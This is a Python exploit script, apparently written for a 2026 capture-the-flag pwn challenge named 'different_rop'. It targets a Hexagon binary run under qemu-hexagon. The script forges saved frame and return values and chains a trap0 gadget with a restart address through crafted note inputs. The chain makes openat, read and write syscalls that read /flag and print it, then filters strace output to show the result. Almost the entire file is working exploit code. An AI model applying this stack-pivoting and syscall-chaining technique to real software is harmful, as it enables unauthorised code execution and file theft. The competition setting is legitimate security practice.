#!/usr/bin/env python3
"""
Exploit v3: consistent stack addressing via corrected restart R29.
"""
import struct, subprocess, os

os.chdir('/data/project/ctf-repo/pwn/nepctf2026/different_rop')

SYS_OPENAT = 56
SYS_READ   = 63
SYS_WRITE  = 64
AT_FDCWD = 0xFFFFFF9C
BSS_BUF  = 0x4bd88
FLAG_ADDR = 0x4080e4e0  # note[32] when buffer at 0x4080e4c0
TRAP0 = 0x2ba08
RESTART = 0x21168

# The restart R29 value that keeps the note buffer at 0x4080e4c0
# S_aligned must be 0x4080e5A8, so note[56] = 0x4080e5A8
RESTART_R29 = 0x4080e5A8

# R30_first (note[48]) for dealloc_return at 0x215f8
# With note at 0x4080e4c0: note[48] is at 0x4080e4f0
# But we need [R30_first - 0x34] >= 0x4080e4c0 (note start)
# R30_first >= 0x4080e4c0 + 0x34 = 0x4080e4f4
# So R30_first = 0x4080e4f8 to have all args within note
R30_FIRST = 0x4080e4f8

# R30_after (note[56]) for dealloc_return at 0x2ba40
# This value becomes the restart R29
# note[56] is at address 0x4080e4f8 (0x4080e4c0 + 56)
R30_AFTER = RESTART_R29

def build_note(sysno, r0, r1, r2, r3=0, r4=0, r5=0, has_flag=False):
    note = bytearray(64)
    struct.pack_into('<I', note, 4,  r5)     # [R30-0x34]
    struct.pack_into('<I', note, 8,  r4)     # [R30-0x30]
    struct.pack_into('<I', note, 12, r3)     # [R30-0x2C]
    struct.pack_into('<I', note, 16, r2)     # [R30-0x28]
    struct.pack_into('<I', note, 20, r1)     # [R30-0x24]
    struct.pack_into('<I', note, 24, r0)     # [R30-0x20]
    struct.pack_into('<I', note, 28, sysno)  # [R30-0x1C]
    if has_flag:
        note[32:38] = b'/flag\x00'
    struct.pack_into('<I', note, 48, R30_FIRST)
    struct.pack_into('<I', note, 52, TRAP0)
    struct.pack_into('<I', note, 56, R30_AFTER)
    struct.pack_into('<I', note, 60, RESTART)
    return note

note1 = build_note(SYS_OPENAT, AT_FDCWD, FLAG_ADDR, 0, has_flag=True)
note2 = build_note(SYS_READ, 3, BSS_BUF, 0x100)
note3 = build_note(SYS_WRITE, 1, BSS_BUF, 0x100)

input_data = b'3\n' + bytes(note1) + b'\n' + b'3\n' + bytes(note2) + b'\n' + b'3\n' + bytes(note3) + b'\n' + b'5\n'

print(f"[*] Input size: {len(input_data)} bytes")
p = subprocess.run(['./qemu-hexagon', '-strace', './pwn'], input=input_data, capture_output=True, timeout=30)

stdout = p.stdout.decode(errors='replace')
stderr = p.stderr.decode(errors='replace')

print(f"STDOUT: {len(stdout)}B  STDERR: {len(stderr)}B\n")

# Show key syscalls
print("=== Syscalls ===")
for line in stderr.split('\n'):
    s = line.strip()
    if any(kw in s for kw in ['openat', 'read(', 'write(', 'SIG', 'exit_group', 'flag']):
        print(s)

# Show output around calibrations
print("\n=== Program output ===")
print(stdout[:2500])
